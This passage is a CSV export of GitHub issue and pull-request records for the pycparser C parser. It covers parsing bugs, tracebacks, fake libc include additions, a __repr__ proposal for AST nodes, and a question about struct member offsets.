    #pragma omp critical
        sum += 1;
```
```c
if (sum < 100)
    #pragma omp critical
    sum += 1;
```
The following will not even parse, but it should:
```c        
do 
    #pragma omp critical
    sum += 1;
while(sum < 100)
```",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/235/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/235/comments,https://api.github.com/repos/eliben/pycparser/issues/235/events,https://github.com/eliben/pycparser/issues/235,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/234,294903333,MDU6SXNzdWUyOTQ5MDMzMzM=,234,func_defs example appears broken,772364,closed,FALSE,NA,NA,9,2018-02-06T20:31:50Z,2018-02-07T21:52:37Z,2018-02-07T21:52:37Z,NONE,NA,"```
➜  pycparser git:(master) python examples/func_defs.py
In file included from examples/c_files/memmgr.c:8:
examples/c_files/memmgr.h:37:7: warning: missing terminating ' character [-Winvalid-pp-token]
// you'll probably want to keep those undefined, because
      ^
examples/c_files/memmgr.h:96:8: warning: extra tokens at end of #endif directive [-Wextra-tokens]
#endif // MEMMGR_H
       ^
       //
examples/c_files/memmgr.c:97:56: warning: missing terminating ' character [-Winvalid-pp-token]
    // that if nbytes is a multiple of nquantas, we don't allocate too much
                                                       ^
examples/c_files/memmgr.c:119:28: warning: missing terminating ' character [-Winvalid-pp-token]
                // its prev's next to its next
                           ^
4 warnings generated.
Traceback (most recent call last):
  File ""examples/func_defs.py"", line 46, in <module>
    show_func_defs(filename)
  File ""examples/func_defs.py"", line 34, in show_func_defs
    cpp_args=r'-Iutils/fake_libc_include')
  File ""/usr/local/lib/python2.7/site-packages/pycparser/__init__.py"", line 93, in parse_file
    return parser.parse(text, filename)
  File ""/usr/local/lib/python2.7/site-packages/pycparser/c_parser.py"", line 152, in parse
    debug=debuglevel)
  File ""/usr/local/lib/python2.7/site-packages/pycparser/ply/yacc.py"", line 331, in parse
    return self.parseopt_notrack(input, lexer, debug, tracking, tokenfunc)
  File ""/usr/local/lib/python2.7/site-packages/pycparser/ply/yacc.py"", line 1199, in parseopt_notrack
    tok = call_errorfunc(self.errorfunc, errtoken, self)
  File ""/usr/local/lib/python2.7/site-packages/pycparser/ply/yacc.py"", line 193, in call_errorfunc
    r = errorfunc(token)
  File ""/usr/local/lib/python2.7/site-packages/pycparser/c_parser.py"", line 1761, in p_error
    column=self.clex.find_tok_column(p)))
  File ""/usr/local/lib/python2.7/site-packages/pycparser/plyparser.py"", line 66, in _parse_error
    raise ParseError(""%s: %s"" % (coord, msg))
pycparser.plyparser.ParseError: examples/c_files/memmgr.c:1:1: before: /
```",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/234/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/234/comments,https://api.github.com/repos/eliben/pycparser/issues/234/events,https://github.com/eliben/pycparser/issues/234,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/233,290413567,MDExOlB1bGxSZXF1ZXN0MTY0MjY4MjYw,233,Extend Xlib objects in fake includes,5410599,closed,FALSE,NA,NA,4,2018-01-22T10:19:43Z,2018-01-23T13:18:36Z,2018-01-23T13:18:29Z,CONTRIBUTOR,NA,Extend the Xlib objects. Needed for a package using a wider range of Xlib items.,NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/233/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/233/comments,https://api.github.com/repos/eliben/pycparser/issues/233/events,https://github.com/eliben/pycparser/pull/233,https://api.github.com/repos/eliben/pycparser/pulls/233
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/232,290408930,MDExOlB1bGxSZXF1ZXN0MTY0MjY0ODQx,232,Extend Xlib objects in fake includes,5410599,closed,FALSE,NA,NA,1,2018-01-22T10:03:38Z,2018-01-22T10:15:56Z,2018-01-22T10:15:56Z,CONTRIBUTOR,NA,Extend the Xlib objects. Needed for a package using a wider range of Xlib items.,NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/232/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/232/comments,https://api.github.com/repos/eliben/pycparser/issues/232/events,https://github.com/eliben/pycparser/pull/232,https://api.github.com/repos/eliben/pycparser/pulls/232
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/231,289980394,MDU6SXNzdWUyODk5ODAzOTQ=,231,template decorator fails if no doc string is present,1885584,closed,FALSE,NA,NA,3,2018-01-19T13:45:52Z,2018-01-19T14:18:17Z,2018-01-19T14:16:04Z,NONE,NA,"**Problem:**
The function `_create_param_rules`, which is called within the `template` decorator, expects `__doc__` to be a string and calls replace on it. If no doc string is present, `__doc__` is `None`, and the function throws an `AttributeError`.

**Steps to reproduce:**
Apply the `template` decorator to any class that does not have a doc string.

**Proposed fix:**
Check for `None` before attempting to call replace.",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/231/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/231/comments,https://api.github.com/repos/eliben/pycparser/issues/231/events,https://github.com/eliben/pycparser/issues/231,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/230,288683332,MDU6SXNzdWUyODg2ODMzMzI=,230,Getting extended info about struct members,6561800,closed,FALSE,NA,NA,2,2018-01-15T18:34:52Z,2018-01-15T22:57:44Z,2018-01-15T21:55:29Z,NONE,NA,"Hello crews,

first of all, thank you for bringing this amazing piece of software!

I'm currently working on improving various Python decompilation tools for binary executables (especially for embedded systems).
One of the important transformation passes is the rewriting of structure members in the form `somePtr->var40` to `somePtr->counter`. This greatly improves the readability of the output code.

Let's consider the following case:

- C headers with structure definitions are available
- `pycparser/examples/using_gcc_E_libc.py `is capable of parsing and displaying them

In order to implement the above described rewriting, I need to get member name and member size for specified struct offset. In other words, something like this is required:

```
name4offs(HWInfo, 40) --> 'cacheSize'
sizeof(HWInfo->cacheSize) --> 4
```

Alternatively, `name4offs` could be implemented by matching a precise offset against offsets returned by `offsetof(someStruct, someMember)`.

Is that currently possible with pycparser? If yes, I'd really appreciate some pointers!

Best regards
Max",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/230/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/230/comments,https://api.github.com/repos/eliben/pycparser/issues/230/events,https://github.com/eliben/pycparser/issues/230,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/229,285158802,MDU6SXNzdWUyODUxNTg4MDI=,229,pycparser 2.18 and pycryptodome 3.4.7 in Gajim 0.16.9,280467,closed,FALSE,NA,NA,1,2017-12-29T21:38:14Z,2017-12-31T12:46:24Z,2017-12-31T12:46:24Z,NONE,NA,"I have [reported problem with Gajim](https://dev.gajim.org/gajim/gajim/issues/8781) failing to start when switched from pycrypto to pycryptodome, but that appears to be an issue with pycparser or maybe pycryptodome. It has been [reported that pycparser 2.14 works fine](https://bugs.gentoo.org/613896#c1).


```
** Message: pygobject_register_sinkfunc is deprecated (GstObject)
/usr/lib64/python2.7/site-packages/pycparser/c_parser.py:20: RuntimeWarning: parsing methods must have __doc__ for pycparser to work properly
  class CParser(PLYParser):
WARNING: There was a problem loading the table file: KeyError('p_direct_id_declarator_1',)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:513: No documentation string specified in function 'p_translation_unit_or_empty' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:522: No documentation string specified in function 'p_translation_unit_1' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:529: No documentation string specified in function 'p_translation_unit_2' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:541: No documentation string specified in function 'p_external_declaration_1' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:546: No documentation string specified in function 'p_external_declaration_2' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:551: No documentation string specified in function 'p_external_declaration_3' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:557: No documentation string specified in function 'p_external_declaration_4' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:562: No documentation string specified in function 'p_pp_directive' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:568: No documentation string specified in function 'p_pppragma_directive' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:580: No documentation string specified in function 'p_function_definition_1' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:597: No documentation string specified in function 'p_function_definition_2' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:608: No documentation string specified in function 'p_statement' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:628: No documentation string specified in function 'p_decl_body' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:688: No documentation string specified in function 'p_declaration' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:697: No documentation string specified in function 'p_declaration_list' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:708: No documentation string specified in function 'p_declaration_specifiers_no_type_1' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:713: No documentation string specified in function 'p_declaration_specifiers_no_type_2' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:718: No documentation string specified in function 'p_declaration_specifiers_no_type_3' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:724: No documentation string specified in function 'p_declaration_specifiers_1' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:729: No documentation string specified in function 'p_declaration_specifiers_2' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:734: No documentation string specified in function 'p_declaration_specifiers_3' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:739: No documentation string specified in function 'p_declaration_specifiers_4' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:744: No documentation string specified in function 'p_declaration_specifiers_5' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:749: No documentation string specified in function 'p_declaration_specifiers_6' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:755: No documentation string specified in function 'p_storage_class_specifier' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:764: No documentation string specified in function 'p_function_specifier' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:769: No documentation string specified in function 'p_type_specifier_no_typeid' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:785: No documentation string specified in function 'p_type_specifier' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:793: No documentation string specified in function 'p_type_qualifier' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:800: No documentation string specified in function 'p_init_declarator_list' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:809: No documentation string specified in function 'p_init_declarator' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:815: No documentation string specified in function 'p_id_init_declarator_list' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:821: No documentation string specified in function 'p_id_init_declarator' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:829: No documentation string specified in function 'p_specifier_qualifier_list_1' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:834: No documentation string specified in function 'p_specifier_qualifier_list_2' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:839: No documentation string specified in function 'p_specifier_qualifier_list_3' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:844: No documentation string specified in function 'p_specifier_qualifier_list_4' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:853: No documentation string specified in function 'p_struct_or_union_specifier_1' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:863: No documentation string specified in function 'p_struct_or_union_specifier_2' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:872: No documentation string specified in function 'p_struct_or_union_specifier_3' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:882: No documentation string specified in function 'p_struct_or_union' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:890: No documentation string specified in function 'p_struct_declaration_list' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:899: No documentation string specified in function 'p_struct_declaration_1' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:937: No documentation string specified in function 'p_struct_declaration_2' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:942: No documentation string specified in function 'p_struct_declarator_list' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:951: No documentation string specified in function 'p_struct_declarator_1' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:956: No documentation string specified in function 'p_struct_declarator_2' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:965: No documentation string specified in function 'p_enum_specifier_1' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:971: No documentation string specified in function 'p_enum_specifier_2' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:976: No documentation string specified in function 'p_enum_specifier_3' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:982: No documentation string specified in function 'p_enumerator_list' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:995: No documentation string specified in function 'p_enumerator' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1011: No documentation string specified in function 'p_declarator' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1123: No documentation string specified in function 'p_pointer' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1153: No documentation string specified in function 'p_type_qualifier_list' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1159: No documentation string specified in function 'p_parameter_type_list' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1168: No documentation string specified in function 'p_parameter_list' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1188: No documentation string specified in function 'p_parameter_declaration_1' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1200: No documentation string specified in function 'p_parameter_declaration_2' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1231: No documentation string specified in function 'p_identifier_list' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1241: No documentation string specified in function 'p_initializer_1' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1246: No documentation string specified in function 'p_initializer_2' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1255: No documentation string specified in function 'p_initializer_list' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1267: No documentation string specified in function 'p_designation' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1275: No documentation string specified in function 'p_designator_list' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1281: No documentation string specified in function 'p_designator' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1287: No documentation string specified in function 'p_type_name' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1298: No documentation string specified in function 'p_abstract_declarator_1' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1306: No documentation string specified in function 'p_abstract_declarator_2' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1311: No documentation string specified in function 'p_abstract_declarator_3' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1321: No documentation string specified in function 'p_direct_abstract_declarator_1' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1325: No documentation string specified in function 'p_direct_abstract_declarator_2' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1336: No documentation string specified in function 'p_direct_abstract_declarator_3' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1345: No documentation string specified in function 'p_direct_abstract_declarator_4' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1356: No documentation string specified in function 'p_direct_abstract_declarator_5' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1365: No documentation string specified in function 'p_direct_abstract_declarator_6' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1375: No documentation string specified in function 'p_direct_abstract_declarator_7' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1386: No documentation string specified in function 'p_block_item' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1394: No documentation string specified in function 'p_block_item_list' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1401: No documentation string specified in function 'p_compound_statement_1' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1407: No documentation string specified in function 'p_labeled_statement_1' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1411: No documentation string specified in function 'p_labeled_statement_2' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1415: No documentation string specified in function 'p_labeled_statement_3' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1419: No documentation string specified in function 'p_selection_statement_1' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1423: No documentation string specified in function 'p_selection_statement_2' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1427: No documentation string specified in function 'p_selection_statement_3' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1432: No documentation string specified in function 'p_iteration_statement_1' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1436: No documentation string specified in function 'p_iteration_statement_2' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1440: No documentation string specified in function 'p_iteration_statement_3' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1444: No documentation string specified in function 'p_iteration_statement_4' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1449: No documentation string specified in function 'p_jump_statement_1' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1453: No documentation string specified in function 'p_jump_statement_2' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1457: No documentation string specified in function 'p_jump_statement_3' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1461: No documentation string specified in function 'p_jump_statement_4' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1467: No documentation string specified in function 'p_expression_statement' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1474: No documentation string specified in function 'p_expression' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1487: No documentation string specified in function 'p_typedef_name' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1491: No documentation string specified in function 'p_assignment_expression' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1505: No documentation string specified in function 'p_assignment_operator' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1520: No documentation string specified in function 'p_constant_expression' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1524: No documentation string specified in function 'p_conditional_expression' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1533: No documentation string specified in function 'p_binary_expression' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1559: No documentation string specified in function 'p_cast_expression_1' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1563: No documentation string specified in function 'p_cast_expression_2' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1567: No documentation string specified in function 'p_unary_expression_1' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1571: No documentation string specified in function 'p_unary_expression_2' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1578: No documentation string specified in function 'p_unary_expression_3' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1587: No documentation string specified in function 'p_unary_operator' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1597: No documentation string specified in function 'p_postfix_expression_1' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1601: No documentation string specified in function 'p_postfix_expression_2' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1605: No documentation string specified in function 'p_postfix_expression_3' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1611: No documentation string specified in function 'p_postfix_expression_4' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1620: No documentation string specified in function 'p_postfix_expression_5' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1626: No documentation string specified in function 'p_postfix_expression_6' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1632: No documentation string specified in function 'p_primary_expression_1' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1636: No documentation string specified in function 'p_primary_expression_2' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1640: No documentation string specified in function 'p_primary_expression_3' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1646: No documentation string specified in function 'p_primary_expression_4' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1650: No documentation string specified in function 'p_primary_expression_5' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1658: No documentation string specified in function 'p_offsetof_member_designator' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1673: No documentation string specified in function 'p_argument_expression_list' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1683: No documentation string specified in function 'p_identifier' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1687: No documentation string specified in function 'p_constant_1' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1696: No documentation string specified in function 'p_constant_2' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1703: No documentation string specified in function 'p_constant_3' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1715: No documentation string specified in function 'p_unified_string_literal' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1726: No documentation string specified in function 'p_unified_wstring_literal' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1737: No documentation string specified in function 'p_brace_open' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1743: No documentation string specified in function 'p_brace_close' (ignored)
WARNING: /usr/lib64/python2.7/site-packages/pycparser/c_parser.py:1749: No documentation string specified in function 'p_empty' (ignored)
ERROR: start symbol translation_unit_or_empty undefined
```",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/229/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/229/comments,https://api.github.com/repos/eliben/pycparser/issues/229/events,https://github.com/eliben/pycparser/issues/229,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/228,282620652,MDExOlB1bGxSZXF1ZXN0MTU4NzQyODA5,228,Add missing fake_libc_includes for POSIX.1-2008 compatibility,34598955,closed,FALSE,NA,NA,1,2017-12-16T12:30:51Z,2017-12-31T12:49:45Z,2017-12-31T12:49:39Z,CONTRIBUTOR,NA,"Various fake libc includes were missing according the POSIX.1-2008 standard. Add those.
See http://pubs.opengroup.org/onlinepubs/9699919799/ and specifically http://pubs.opengroup.org/onlinepubs/9699919799/idx/head.html",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/228/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/228/comments,https://api.github.com/repos/eliben/pycparser/issues/228/events,https://github.com/eliben/pycparser/pull/228,https://api.github.com/repos/eliben/pycparser/pulls/228
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/227,282231520,MDExOlB1bGxSZXF1ZXN0MTU4NDU3MDc5,227,Implement __repr__ on Nodes (Issue #226),13061643,closed,FALSE,NA,NA,0,2017-12-14T20:37:42Z,2018-01-17T13:31:30Z,2018-01-17T13:31:30Z,CONTRIBUTOR,NA,"This is a first attempt at implementing python's `__repr__` method on `*Node` types (Issue #226).

Notes:
- This is limited to constructor parameters (any attribute not passed in constructor parameters is not displayed).
- The `coord` constructor parameter is not displayed. This is intentional, as my main use-case of the `__repr__` method is for rapid prototyping of an AST, and `coord` would just add noise to the output.
- I don't really like the way `_get_repr` is implemented (a bit too cryptic), or the way generated code works (creates a lot of intermediate objects, and does too many string replacements).
- Style of the results of a `repr` call tries to be close to PEP8.

Any improvement idea is welcome.",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/227/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/227/comments,https://api.github.com/repos/eliben/pycparser/issues/227/events,https://github.com/eliben/pycparser/pull/227,https://api.github.com/repos/eliben/pycparser/pulls/227
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/226,282225661,MDU6SXNzdWUyODIyMjU2NjE=,226,Support __repr__ on nodes,13061643,closed,FALSE,NA,NA,3,2017-12-14T20:15:50Z,2018-01-19T13:59:52Z,2018-01-19T13:59:52Z,CONTRIBUTOR,NA,"When creating parts of an AST from scratch, figuring out the actual types to use (as well as their correct constructor parameters), is currently a manual (and error-prone), process:
1. Create a source close to the intended code
2. Dump the AST, using `FileAST.show()`
3. Guess what types are needed, and refine until the correct structure is achieved.

Implementing [`__repr__`](https://docs.python.org/3/library/functions.html#repr) would definitely help, as step 3 would be a copy/paste of the `__repr__` output.

For example, using `tests_list_children`'s structure, `repr(comp)` could return:
```
Compound(block_items=[BinaryOp(op='+',
                               left=Constant(type='float',
                                             value='5.6'
                                             ),
                               right=Constant(type='char',
                                              value='t'
                                              )
                               ),
                      BinaryOp(op='-',
                               left=BinaryOp(op='+',
                                             left=Constant(type='float',
                                                           value='5.6'
                                                           ),
                                             right=Constant(type='char',
                                                            value='t'
                                                            )
                                             ),
                               right=Constant(type='char',
                                              value='t'
                                              )
                               ),
                      Constant(type='float',
                               value='5.6'
                               ),
                      Constant(type='char',
                               value='t'
                               )
                     ]
         )
```


",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/226/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/226/comments,https://api.github.com/repos/eliben/pycparser/issues/226/events,https://github.com/eliben/pycparser/issues/226,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/225,279993602,MDU6SXNzdWUyNzk5OTM2MDI=,225,re-add main for _ast_gen.py,727510,closed,FALSE,NA,NA,2,2017-12-07T04:01:54Z,2017-12-08T20:11:02Z,2017-12-07T13:52:53Z,NONE,NA,"When experimenting with changes to the AST, it was very helpful to have __main__ in _ast_gen.py to be able to quickly re-generate the c_ast.py.  Can you re-add?
If not, do you have a method for re-generating the ast other than just running the same code as in the main in interactive shell?",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/225/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/225/comments,https://api.github.com/repos/eliben/pycparser/issues/225/events,https://github.com/eliben/pycparser/issues/225,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/224,279166991,MDU6SXNzdWUyNzkxNjY5OTE=,224,fake_libc_include not included in distributed version of library,28734,closed,FALSE,NA,NA,7,2017-12-04T22:03:03Z,2021-03-25T12:17:33Z,2017-12-09T23:51:34Z,NONE,NA,"The `fake_libc_include` directory is not included in the version of the library installed from PyPI with pip.

This means that I cannot do something like:

```
pycparser_path = os.path.basename(pycparser.__file__)
include_path = os.path.join(pycparser_path, 'utils', 'fake_libc_include')
ast = parse_file(filename, use_cpp=True, cpp_args=rf'-I{include_path}')
```

Instead I have to vendor `fake_libc_include` (which is not the end of the world!).

Would you consider a patch to fix this?",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/224/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/224/comments,https://api.github.com/repos/eliben/pycparser/issues/224/events,https://github.com/eliben/pycparser/issues/224,NA
